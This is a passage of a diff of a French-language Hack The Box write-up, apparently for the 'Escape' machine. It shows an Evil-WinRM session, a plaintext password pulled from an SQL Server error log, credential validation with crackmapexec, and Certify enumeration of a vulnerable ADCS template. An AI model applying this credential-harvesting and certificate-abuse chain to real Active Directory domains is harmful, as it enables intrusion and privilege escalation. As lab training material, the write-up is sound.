+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Warning:<span class="w"> </span>Remote<span class="w"> </span>path<span class="w"> </span>completions<span class="w"> </span>is<span class="w"> </span>disabled<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>ruby<span class="w"> </span>limitation:<span class="w"> </span>quoting_detection_proc<span class="o">()</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>is<span class="w"> </span>unimplemented<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>machine<span class="w">                                                       </span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>Data:<span class="w"> </span>For<span class="w"> </span>more<span class="w"> </span>information,<span class="w"> </span>check<span class="w"> </span>Evil-WinRM<span class="w"> </span>GitHub:<span class="w"> </span>https://github.com/Hackplayers/evil-winrm#Remote-path-completion<span class="w">                                                                         </span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>Info:<span class="w"> </span>Establishing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>endpoint
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt;<span class="w"> </span>whoami<span class="w"> </span>/all
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>USER<span class="w"> </span>INFORMATION<span class="w">                                                                                                                           </span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>----------------<span class="w">                                                                                                                            </span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>User<span class="w"> </span>Name<span class="w">      </span><span class="nv">SID</span><span class="w">                                                                                                                        </span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="o">==============</span><span class="w"> </span><span class="o">==============================================</span><span class="w">                                                                              </span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>sequel<span class="se">\s</span>ql_svc<span class="w"> </span>S-1-5-21-4078382237-1492182817-2568127209-1106<span class="w">                           </span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>GROUP<span class="w"> </span>INFORMATION<span class="w">                                                            </span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>-----------------<span class="w">                                                                       </span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>Group<span class="w"> </span>Name<span class="w">                                  </span>Type<span class="w">             </span>SID<span class="w">          </span><span class="nv">Attributes</span><span class="w">                                                       </span>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="o">===========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">               </span>
+</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a>Everyone<span class="w">                                    </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group<span class="w">               </span>
+</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>BUILTIN<span class="se">\R</span>emote<span class="w"> </span>Management<span class="w"> </span>Users<span class="w">             </span>Alias<span class="w">            </span>S-1-5-32-580<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group<span class="w">               </span>
+</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>BUILTIN<span class="se">\U</span>sers<span class="w">                               </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a>BUILTIN<span class="se">\P</span>re-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w">  </span>Alias<span class="w">            </span>S-1-5-32-554<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a>BUILTIN<span class="se">\C</span>ertificate<span class="w"> </span>Service<span class="w"> </span>DCOM<span class="w"> </span>Access<span class="w">     </span>Alias<span class="w">            </span>S-1-5-32-574<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>ETWORK<span class="w">                        </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-2<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">              </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-30"><a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>TLM<span class="w"> </span>Authentication<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-64-10<span class="w">  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-10-31"><a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a>Mandatory<span class="w"> </span>Label<span class="se">\M</span>edium<span class="w"> </span>Plus<span class="w"> </span>Mandatory<span class="w"> </span>Level<span class="w"> </span>Label<span class="w">            </span>S-1-16-8448
+</span><span id="__span-10-32"><a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a>
+</span><span id="__span-10-33"><a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a>
+</span><span id="__span-10-34"><a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a>PRIVILEGES<span class="w"> </span>INFORMATION
+</span><span id="__span-10-35"><a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a>----------------------
+</span><span id="__span-10-36"><a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a>
+</span><span id="__span-10-37"><a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                    </span><span class="nv">State</span>
+</span><span id="__span-10-38"><a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span>
+</span><span id="__span-10-39"><a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">     </span>Enabled
+</span><span id="__span-10-40"><a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">       </span>Enabled
+</span><span id="__span-10-41"><a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w"> </span>Enabled
+</span><span id="__span-10-42"><a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a>
+</span><span id="__span-10-43"><a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a>
+</span><span id="__span-10-44"><a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a>USER<span class="w"> </span>CLAIMS<span class="w"> </span>INFORMATION
+</span><span id="__span-10-45"><a id="__codelineno-10-45" name="__codelineno-10-45" href="#__codelineno-10-45"></a>-----------------------
+</span><span id="__span-10-46"><a id="__codelineno-10-46" name="__codelineno-10-46" href="#__codelineno-10-46"></a>
+</span><span id="__span-10-47"><a id="__codelineno-10-47" name="__codelineno-10-47" href="#__codelineno-10-47"></a>User<span class="w"> </span>claims<span class="w"> </span>unknown.
+</span><span id="__span-10-48"><a id="__codelineno-10-48" name="__codelineno-10-48" href="#__codelineno-10-48"></a>
+</span><span id="__span-10-49"><a id="__codelineno-10-49" name="__codelineno-10-49" href="#__codelineno-10-49"></a>Kerberos<span class="w"> </span>support<span class="w"> </span><span class="k">for</span><span class="w"> </span>Dynamic<span class="w"> </span>Access<span class="w"> </span>Control<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>device<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>disabled.
+</span></code></pre></div>
 <p>Et à partir de là, j'ai un peu galéré à avancer... Notre utilisateur ne semble pas avoir de droits particulier à première vue, winpeas ne m'a pas spécialement aidé autrement qu'en confirmant l'utilisation de certificat (mais rien de trouvable avec cet utilisateur). J'ai tenté d'énumérer des users kerberoastables mais rien de concluant non plus. </p>
 <p>Bon, je tourne un peu dans le système "à la mano", à la recherche de trucs intéressants... Jusqu'à tomber sur ce fichier:</p>
-<pre><code class="language-powershell">*Evil-WinRM* PS C:\SQLServer\Logs&gt; type ERRORLOG.BAK
-</code></pre>
-<p>On y trouve notamment cette ligne : </p>
-<pre><code>2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
-2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
-2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
-2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">SQLServer</span><span class="p">\</span><span class="n">Logs</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">ERRORLOG</span><span class="p">.</span><span class="n">BAK</span>
+</span></code></pre></div>
+<p>On y trouve notamment cette ligne : 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</span></code></pre></div></p>
 <p>On imagine donc que le password de 'sequel.htb\Ryan.Cooper' puisse être 'NuclearMosquito3'.</p>
-<pre><code class="language-bash">pak@kali:~$ crackmapexec winrm sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'
-SMB         dc.sequel.htb   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
-HTTP        dc.sequel.htb   5985   DC               [*] http://dc.sequel.htb:5985/wsman
-WINRM       dc.sequel.htb   5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>pak@kali:~$<span class="w"> </span>crackmapexec<span class="w"> </span>winrm<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span>Ryan.Cooper<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;NuclearMosquito3&#39;</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>SMB<span class="w">         </span>dc.sequel.htb<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>HTTP<span class="w">        </span>dc.sequel.htb<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>http://dc.sequel.htb:5985/wsman
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>WINRM<span class="w">       </span>dc.sequel.htb<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></code></pre></div>
 <p>Let's go ! On se connecte, et on a enfin le flag utilisateur :). Je retente un peu d'énumération au cas où, mais je ne trouve rien de particulier. C'est là que je me souviens de l'utilisation des certificats ! Tentons !</p>
-<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; .\Certify.exe find /vulnerable
-
-   _____          _   _  __
-  / ____|        | | (_)/ _|
- | |     ___ _ __| |_ _| |_ _   _
- | |    / _ \ '__| __| |  _| | | |
- | |___|  __/ |  | |_| | | | |_| |
-  \_____\___|_|   \__|_|_|  \__, |
-                             __/ |
-                            |___./
-  v1.0.0
-
-[*] Action: Find certificate templates
-[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
-
-[*] Listing info about the Enterprise CA 'sequel-DC-CA'
-
-    Enterprise CA Name            : sequel-DC-CA
-    DNS Hostname                  : dc.sequel.htb
-    FullName                      : dc.sequel.htb\sequel-DC-CA
-    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
-    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
-    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
-    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
-    Cert Start Date               : 11/18/2022 12:58:46 PM
-    Cert End Date                 : 11/18/2121 1:08:46 PM
-    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
-    UserSpecifiedSAN              : Disabled
-    CA Permissions                :
-      Owner: BUILTIN\Administrators        S-1-5-32-544
-
-      Access Rights                                     Principal
-
-      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
-      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
-      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
-      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
-    Enrollment Agent Restrictions : None
-
-[!] Vulnerable Certificates Templates :
-
-    CA Name                               : dc.sequel.htb\sequel-DC-CA
-    Template Name                         : UserAuthentication
-    Schema Version                        : 2
-    Validity Period                       : 10 years
-    Renewal Period                        : 6 weeks
-    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
-    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
-    Authorized Signatures Required        : 0
-    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
-    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
-                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
-                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
-      Object Control Permissions
-        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
-        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
-                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
-                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
-        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
-                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
-                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
-        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
-                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
-                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
-
-
-
-Certify completed in 00:00:09.2906146
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Ryan</span><span class="p">.</span><span class="n">Cooper</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>  <span class="p">/</span> <span class="n">____</span><span class="p">|</span>        <span class="p">|</span> <span class="p">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)/</span> <span class="n">_</span><span class="p">|</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a> <span class="p">|</span> <span class="p">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a> <span class="p">|</span> <span class="p">|</span>    <span class="p">/</span> <span class="n">_</span> <span class="p">\</span> <span class="s1">&#39;__| __| |  _| | | |</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="s1"> | |___|  __/ |  | |_| | | | |_| |</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="s1">  \_____\___|_|   \__|_|_|  \__, |</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="s1">                             __/ |</span>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="s1">                            |___./</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="s1">  v1.0.0</span>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="s1">[*] Action: Find certificate templates</span>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="s1">[*] Using the search base &#39;</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">sequel</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span><span class="s1">&#39;</span>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="s1">[*] Listing info about the Enterprise CA &#39;</span><span class="n">sequel-DC-CA</span><span class="err">&#39;</span>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">sequel-DC-CA</span>
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">dc</span><span class="p">.</span><span class="n">sequel</span><span class="p">.</span><span class="n">htb</span>
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">dc</span><span class="p">.</span><span class="n">sequel</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">sequel-DC-CA</span>
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
+</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">sequel-DC-CA</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">sequel</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="n">A263EA89CAFE503BB33513E359747FD262F91A56</span>
+</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="n">1EF2FA9A7E6EADAD4F5382F4CE283101</span>
+</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>    <span class="n">Cert</span> <span class="nb">Start </span><span class="n">Date</span>               <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2022</span> <span class="n">12</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">46</span> <span class="n">PM</span>
+</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>    <span class="n">Cert</span> <span class="k">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2121</span> <span class="n">1</span><span class="p">:</span><span class="n">08</span><span class="p">:</span><span class="n">46</span> <span class="n">PM</span>
+</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">sequel-DC-CA</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">sequel</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>    <span class="n">UserSpecifiedSAN</span>              <span class="p">:</span> <span class="n">Disabled</span>
+</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
+</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
+</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>
+</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>
+</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>
+</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">UsersS</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>
+</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
